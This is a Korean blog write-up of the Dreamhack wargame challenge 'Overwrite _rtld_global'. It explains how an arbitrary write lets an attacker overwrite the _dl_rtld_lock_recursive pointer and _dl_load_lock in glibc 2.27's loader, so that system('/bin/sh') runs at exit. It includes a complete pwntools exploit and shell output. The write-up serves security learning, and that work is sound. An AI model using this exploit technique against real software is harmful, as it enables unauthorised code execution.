---
title: "[Dreamhack] Overwrite _rtld_global Write up"
author: d0razi
date: 2023-12-05 14:00
categories: [InfoSec, Pwn]
tags: [Write up, Dreamhack]
image: /assets/img/media/banner/dreamhack.jpg
---

```c
// Name: ow_rtld.c
// Compile: gcc -o ow_rtld ow_rtld.c

#include <stdio.h>
#include <stdlib.h>

void init() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

int main() {
    long addr;
    long data;
    int idx;

    init();

    printf("stdout: %p\n", stdout);
    while (1) {
        printf("> ");
        scanf("%d", &idx);
        switch (idx) {
            case 1:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("data: ");
                scanf("%ld", &data);
                *(long long *)addr = data;
                break;
            default:
		        return 0;
	    }
    }
    return 0;
}
```

코드를 간단하게 분석해보겠다.

`stdout` 주소를 출력해주기 때문에 메모리 leak은 걱정 안해도 될 것 같다.

그리고 idx를 입력받는다

idx가 1이면 `addr` 변수와 `data` 변수에 값을 입력받고 `addr` 주소를 `data` 값으로 조작한다.

```bash
❯ checksec --file ow_rtld
[*] '/dreamhack/Overwrite_rtld_global/ow_rtld'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

보호기법은 위와 같아서 got_overwrite도 불가능하다. free도 사용되지 않았기 때문에 freehook_overwrite도 불가능하다.

이럴때에는 프로세스가 종료 될 때 호출 되는 구조체를 사용할 수 있다.

***

프로세스가 종료될 때는 다음과 같은 흐름으로 진행된다.

`__GI_exit` -> `__run_exit_handlers` -> `_dl_fini`

이 때 `_dl_fini` 함수 내부에 우리가 사용할 수 있는 변수와 구조체가 있다.

```c
# define __rtld_lock_lock_recursive(NAME) \ 
	GL(dl_rtld_lock_recursive) (&(NAME).mutex) 
	
void
_dl_fini (void) {
	#ifdef SHARED 
		int do_audit = 0; 
	again:
	#endif 
		for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns) { 			 
			__rtld_lock_lock_recursive (GL(dl_load_lock));
```

위 코드는 `_dl_fini` 함수 내부 코드이다. for문 안을 보면 `dl_load_lock` 을 인자로 `_rtld_lock_lock_recursive` 함수를 호출하는 것을 볼 수 있다. 

`dl_load_lock` & `_rtld_lock_lock_recursive` 는 `_rtld_global` 구조체 안에 들어있다.

```bash
_dl_load_lock = {
	mutex = {
	    __data = {
        __lock = 0x0,
        __count = 0x0,
        __owner = 0x0,
        __nusers = 0x0,
        __kind = 0x0,
        __spins = 0x0,
        __elision = 0x0,
        __list = {
	        __prev = 0x0,
	        __next = 0x0
        }
    },
    __size = '\000' <repeats 39 times>,
    __align = 0x0
	}
}
	_dl_rtld_lock_recursive = 0x0,
```

위 코드는 ld 파일을 gdb로 열어서 `p _rtld_global` 명령을 사용해서 출력된 코드입니다.

`_dl_rtld_lock_recursive` 함수 포인터에는 `rtld_lock_default_lock_recursive` 함수 주소를 저장하고 있기 때문에, `_dl_rtld_lock_recursive` 를 원하는 함수 주소로 덮어 쓰면 프로그램이 종료될 때 덮어쓴 함수가 호출된다.

***

앞에서 설명한 기법으로 익스플로잇을 할 수 있다.

> **시나리오**
> 1. libc base & ld base 계산
> 2.  rtld 구조체 주소 계산
> 3. 구조체 값 조작

이렇게 시나리오를 짰다.

<br>

**libc base & ld base 계산**

```
gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000555555400000 0x0000555555401000 0x0000000000001000 0x0000000000000000 r-x /dreamhack/Overwrite_rtld_global/ow_rtld  <-  $rax, $rcx, $rip, $r12
0x0000555555600000 0x0000555555601000 0x0000000000001000 0x0000000000000000 r-- /dreamhack/Overwrite_rtld_global/ow_rtld
0x0000555555601000 0x0000555555602000 0x0000000000001000 0x0000000000001000 rw- /dreamhack/Overwrite_rtld_global/ow_rtld
0x0000555555602000 0x0000555555603000 0x0000000000001000 0x0000000000003000 rw- /dreamhack/Overwrite_rtld_global/ow_rtld
0x0000555555603000 0x0000555555604000 0x0000000000001000 0x0000000000004000 rw- /dreamhack/Overwrite_rtld_global/ow_rtld
0x00007ffff79e4000 0x00007ffff7bcb000 0x00000000001e7000 0x0000000000000000 r-x /dreamhack/Overwrite_rtld_global/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x0000000000200000 0x00000000001e7000 --- /dreamhack/Overwrite_rtld_global/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x0000000000004000 0x00000000001e7000 r-- /dreamhack/Overwrite_rtld_global/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x0000000000002000 0x00000000001eb000 rw- /dreamhack/Overwrite_rtld_global/libc-2.27.so  <-  $r8, $r9
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000004000 0x0000000000000000 rw-
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000027000 0x0000000000000000 r-x /dreamhack/Overwrite_rtld_global/ld-2.27.so
0x00007ffff7ff4000 0x00007ffff7ff6000 0x0000000000002000 0x0000000000000000 rw- <tls-th1>
0x00007ffff7ff6000 0x00007ffff7ffa000 0x0000000000004000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000001000 0x0000000000027000 r-- /dreamhack/Overwrite_rtld_global/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000001000 0x0000000000028000 rw- /dreamhack/Overwrite_rtld_global/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000001000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $rdx, $rsp, $rbp, $rsi, $r13
gef> p/d 0x00007ffff7dd5000 - 0x00007ffff79e4000
$2 = 4132864
gef> p/x 0x00007ffff7dd5000 - 0x00007ffff79e4000
$3 = 0x3f1000
```

libc base <-> ld base 오프셋은 `0x3f1000`이다

```python
from pwn import *

#p = process('./ow_rtld')
p = remote('host3.dreamhack.games', 14818)
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

# leak addr
p.recvuntil(b'stdout: ')
leak = int(p.recvline()[:-1], 16)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000
```

<br>

**rtld 구조체 주소 계산**

이 부분이 난해한 것 같다. 일단 드림핵에서 공부한 대로 설명을 해보겠다.

먼저 구조체의 오프셋을 구하기 위해서는 일반 ld 파일이 아닌 디버깅 심볼까지 담고 있는 ld 파일이 필요하다.

먼저 드림핵에서 제공해준 libc 파일을 ubuntu18.04 에서 실행하면 아래와 같이 뜬다.

```
➜  Overwrite_rtld_global ./libc-2.27.so
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.3.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

첫번째 라인에 출력된 `Ubuntu GLIBC 2.27-3ubuntu1` 이것이 Glibc의 상세 버전이다.

해당 버전의 `libc6-dbg` 패키지를 받으면 안에 디버깅 심볼이 포함된 ld 파일이 있다.

https://launchpad.net/ubuntu/bionic/amd64/libc6-dbg/2.27-3ubuntu1

위 링크에서 해당 패키지를 받을 수 있다.

`dpkg -x libc6-dbg_2.27-3ubuntu1_amd64.deb ./` 명령어를 사용하면 `usr`라는 디렉터리가 생성된다.

`./usr/lib/debug/lib/x86_64-linux-gnu/ld-2.27.so` 경로에 파일이 있다.

해당 파일을 gdb로 열면 구조체의 오프셋을 알 수 있다.

```
gef➤  p &_rtld_global._dl_load_lock
$1 = (__rtld_lock_recursive_t *) 0x228968 <_rtld_local+2312>
gef➤  p &_rtld_global._dl_rtld_lock_recursive
$2 = (void (**)(void *)) 0x228f60 <_rtld_local+3840>
```

주소 계산식은 `ld_base + _rltd_global + offset` 다

```python
from pwn import *

#p = process('./ow_rtld')
p = remote('host3.dreamhack.games', 14818)
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

# leak addr
p.recvuntil(b'stdout: ')
leak = int(p.recvline()[:-1], 16)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000

rtld_global = ld_base + ld.symbols['_rtld_global']

dl_load_lock = rtld_global + 2312
dl_recursive = rtld_global + 3840

system = libc_base + libc.symbols['system']

print("libc :", hex(libc_base))
print("ld :", hex(ld_base))
print('dl_load_lock :', hex(dl_load_lock))
print('dl_rtld_lock_recursive :', hex(dl_recursive))
print('system :', hex(system))
```

<br>

**구조체 값 조작**

```python
from pwn import *

#p = process('./ow_rtld')
p = remote('host3.dreamhack.games', 14818)
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

# leak addr
p.recvuntil(b'stdout: ')
leak = int(p.recvline()[:-1], 16)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000

rtld_global = ld_base + ld.symbols['_rtld_global']

dl_load_lock = rtld_global + 2312
dl_recursive = rtld_global + 3840

system = libc_base + libc.symbols['system']

print("libc :", hex(libc_base))
print("ld :", hex(ld_base))
print('dl_load_lock :', hex(dl_load_lock))
print('dl_rtld_lock_recursive :', hex(dl_recursive))
print('system :', hex(system))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
p.sendlineafter(b'data: ', str(u64('/bin/sh\x00')).encode())
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_recursive).encode())
p.sendlineafter(b'data: ', str(system).encode())
p.sendlineafter(b'> ', b'2')

p.interactive()
```

```
❯ py ex.py
[+] Opening connection to host3.dreamhack.games on port 9729: Done
[*] '/dreamhack/Overwrite_rtld_global/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/dreamhack/Overwrite_rtld_global/ld-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc : 0x7f1690476000
ld : 0x7f1690867000
dl_load_lock : 0x7f1690a8f968
dl_rtld_lock_recursive : 0x7f1690a8ff60
system : 0x7f16904c5440
[*] Switching to interactive mode
$ id
uid=1000(ow_rtld) gid=1000(ow_rtld) groups=1000(ow_rtld)
$ cat flag
DH{--------------------Flag--------------------}
```